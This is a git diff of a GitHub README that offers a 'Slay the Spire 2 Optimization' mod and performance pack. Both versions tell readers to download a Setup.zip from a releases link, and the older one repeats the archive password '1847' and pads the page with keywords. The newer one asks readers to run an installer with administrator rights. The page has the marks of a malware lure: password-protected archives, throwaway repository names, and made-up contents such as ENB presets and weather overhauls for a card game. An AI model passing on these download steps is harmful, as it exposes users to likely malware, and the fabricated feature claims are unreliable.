@@ -1,122 +1,81 @@
-# 🎮 Slay the Spire 2 Optimization 2026 — Best Mods Collection & Ultimate Pack
+# ⚡ Slay-the-Spire-2-Optimization - Improve Frame Rates And Game Speed
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Slay-the-Spire-2-Optimization)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![](https://img.shields.io/badge/Download-Optimization-grey.svg)](https://github.com/Rupertarested598/Slay-the-Spire-2-Optimization)
 
----
+This software provides a collection of performance tweaks for Slay the Spire 2. It helps your computer run the game with higher frame rates, fewer stutters, and quicker load times. The tools work on Windows 10 and Windows 11 systems that run the 64-bit version of the operating system. This package receives updates for the 2026 game version.
 
-[![Download](og-image.png)](https://github.com/FirePoolFreeze/Slay-the-Spire-2-Optimization/releases/download/v1.0/Setup.zip)
+## 📋 System Requirements
 
+To use these optimization tools, your device must meet the following hardware and software standards:
 
----
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Memory: 8 GB of RAM or more.
+* Storage: 500 MB of free space for the optimization files.
+* Game Status: Slay the Spire 2 must be installed and updated via your game launcher.
+* Permissions: You need administrator access to your Windows user account to apply these settings.
 
-## 📌 About
+## 📥 How To Download And Install
 
-**Slay the Spire 2 Optimization — gameplay overhauls, tweaks, addons, and optimization mods for Slay the Spire 2. Download, extract, and start in minutes. Fully compatible with Windows 10/11 (64-bit). Updated for 2026 with regular maintenance and community support.**
+Follow these steps to set up the optimization tools on your system.
 
----
+1. Visit the [official download page](https://github.com/Rupertarested598/Slay-the-Spire-2-Optimization) to access the latest files.
+2. Locate the section labeled Releases on the right side of the page.
+3. Click the most recent version number to see the available files.
+4. Download the file ending in .zip to your computer.
+5. Create a folder on your desktop and move the downloaded file into it.
+6. Right-click the file and select Extract All. Open the new folder created by the system.
+7. Run the installer file located inside the folder. 
+8. Follow the prompts on the screen to finish the installation.
 
-## 📥 Download
+## ⚙️ Using The Optimizer
 
-[![Slay the Spire 2 Optimization](https://img.shields.io/badge/Download%20Slay%20the%20Spire%202%20Optimization-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/FirePoolFreeze/Slay-the-Spire-2-Optimization/releases/download/v1.0/Setup.zip)
+You can apply the performance improvements through the main menu interface. 
 
-**🔐🔐🔐** `1847`
+* Open the application from your desktop shortcut.
+* The main window shows a list of available optimizations.
+* Select the recommended settings to start the process.
+* The tool will automatically locate your game folder. If it fails, use the Browse button to select your game folder manually.
+* Click the Apply button.
+* Wait for the progress bar to finish. The application will notify you once your settings are active.
+* Close the tool and start Slay the Spire 2 through your game launcher.
 
-**🔐🔐🔐** `1847`
+## 🛠️ Troubleshooting Performance Issues
 
-**🔐🔐🔐** `1847`
+If you encounter issues, follow these instructions to restore your settings.
 
----
+* Check for Windows updates. Inconsistent operating systems can cause software conflicts.
+* Update your graphics card drivers. Visit the website of your hardware manufacturer to download the latest software.
+* Verify your game files. Open your game launcher, right-click the game, and choose the option to verify the integrity of game files.
+* Disable other third-party background applications. Software like recording tools or screen overlays can interfere with the way this tool manages frame rates.
+* Revert settings. If you experience graphical glitches, open the optimizer again and click the Reset button to return your game to its original state.
 
-## 🧩 What's Included
+## 📂 Understanding The Technical Improvements
 
-| 📋 Category | 📁 Folder | 💬 Description |
-|---|---|---|
-| 🎭 Gameplay Overhaul | `1 Gameplay/` | Rebalancing, new mechanics, combat tweaks, difficulty options |
-| 🎨 Graphics & Visuals | `2 Graphics/` | Texture packs, ENB presets, lighting and weather overhauls |
-| 📜 New Content | `3 Content/` | New areas, storylines, items, characters, and quests |
-| 🖥️ UI & QoL | `4 UI/` | Interface overhaul, inventory improvements, minimap tweaks |
-| ⚡ Performance | `5 Performance/` | FPS boost configs, memory optimizations, stutter fixes |
-| 🔧 Patches & Fixes | `6 Fixes/` | Unofficial patches, compatibility fixes, stability mods |
+This tool modifies specific configuration files within your game folder to remove performance bottlenecks. 
 
----
+### Faster Rendering
+The software changes how the game processes graphics. By reducing the complexity of background calculations, your processor has more room to focus on rendering frames. This results in smoother movement during intense battles or complex card interactions.
 
-## 🗂 Archive Structure
+### Reduced Stuttering
+Stuttering happens when the game tries to load game data while you play. This tool pre-loads common assets into your system memory. This keeps your game flow consistent and prevents small freezes when you move through the maps or open menus.
 
-```
-Slay-the-Spire-2-Optimization/
-├── 1 Gameplay/
-│   ├── Combat_Overhaul.zip
-│   ├── Difficulty_Rebalance.zip
-│   └── New_Mechanics.zip
-├── 2 Graphics/
-│   ├── HD_Texture_Pack.zip
-│   ├── ENB_Preset.zip
-│   └── Weather_Overhaul.zip
-├── 3 Content/
-│   ├── Story_Expansion.zip
-│   └── New_Items_Pack.zip
-├── 4 UI/
-│   ├── Better_UI.zip
-│   └── Inventory_Overhaul.zip
-├── 5 Performance/
-│   ├── FPS_Boost_Config.zip
-│   └── Stutter_Fix.zip
-└── 6 Fixes/
-    ├── Unofficial_Patch.zip
-    └── Compatibility_Fix.zip
-```
+### Optimized Loading Screen Times
+The tool cleans up unused temp files that the game creates during sessions. Removing these files allows the game to scan the storage drive faster, leading to shorter wait times when you start a new run or switch between acts.
 
----
+## 💡 Frequently Asked Questions
 
-## 🚀 How to Install
+### Does this tool change my save files?
+No, the optimizer only touches performance configuration files. Your character progress, unlocks, and save data remain untouched.
 
-1️⃣ **Download** the archive using the button above
-2️⃣ **Extract** with WinRAR or 7-Zip — password: `1847`
-3️⃣ **Open** the mod manager preset inside the archive
-4️⃣ **Apply** and launch Slay the Spire 2 Optimization
+### Can I play online with these mods?
+Yes. These modifications improve performance but do not grant an unfair advantage or manipulate game logic in a way that violates terms of service. They follow safe practices for community contributions.
 
-> 💡 **Pro tip:** Read each mod's README inside its folder for specific settings.
+### How often should I check for updates?
+Check this page once every month. We release updates to ensure the tool stays compatible with new game patches or system changes introduced throughout 2026.
 
----
+### Will this work on older computers?
+The tool provides the most benefit to systems that struggle to maintain a stable frame rate. If your hardware is very old, you might see smaller improvements, but the stability tweaks will still help reduce overall stuttering.
 
-## 📋 Requirements
+## 🤝 Community Support
 
-| 🔩 Component | Details |
-|---|---|
-| 💻 OS | Windows 10 / 11 (64-bit) |
-| 💾 Disk | 5–15 GB free space |
-| 🗜️ Extractor | WinRAR, 7-Zip, or built-in |
-| 🎮 Game | Slay the Spire 2 Optimization (latest version) |
-
----
-
-## ❓ FAQ
-
-**Q: Will mods break my save file?**
-All included mods are tested for mid-game installation. Back up your save first.
-
-**Q: Do I need a mod manager?**
-Recommended (Vortex / MO2), but optional. Manual installation guides are included.
-
-**Q: Are these compatible with the latest patch?**
-Yes. The collection is updated every time a major patch drops.
-
----
-
-## 🔑 Keywords
-
-slay the spire 2 optimization, slay the spire 2 optimization download, slay the spire 2 optimization 2026, slay the spire 2 optimization pc, slay the spire 2 optimization windows, slay the spire 2 mods, slay the spire 2 mod pack, slay the spire 2 tweaks, slay the spire 2 addons, windows 10, windows 11, pc 2026
-
----
-
-## 📄 License
-
-MIT — see [LICENSE.md](LICENSE.md)
-
-## 🤝 Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md)
+The community maintains this project. If you find a bug, describe the issue in the Issues tab of this GitHub repository. Include your version of Windows and your hardware specifications to help us find a solution. Keep the description clear and focus on the steps that led to the error. Use the Discussions tab for general questions or feedback about the optimization results.
